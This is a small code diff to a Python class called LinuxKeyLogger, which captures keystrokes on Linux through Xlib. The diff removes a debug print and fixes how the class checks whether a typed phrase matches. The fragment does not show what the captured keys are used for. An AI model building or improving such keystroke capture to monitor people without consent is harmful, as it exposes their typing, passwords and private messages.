@@ -64,7 +64,6 @@ class LinuxKeyLogger(threading.Thread):
         :param event:
         :return: None
         """
-        print(event)
         if (event.type == X.KeyRelease):
             char = Xlib.XK.keysym_to_string(self.display.keycode_to_keysym(event.detail, event.state))
             if char is not None:
@@ -108,7 +107,7 @@ class LinuxKeyLogger(threading.Thread):
         length = len(phrase)
         capLength = len(self.windowKeys)
         if (capLength >= length):
-            section = self.capturedKeys[capLength - length:capLength]
+            section = self.windowKeys[capLength - length:capLength]
             lastWords = ''.join(section)
             if (lastWords.upper() == phrase):
                 return True
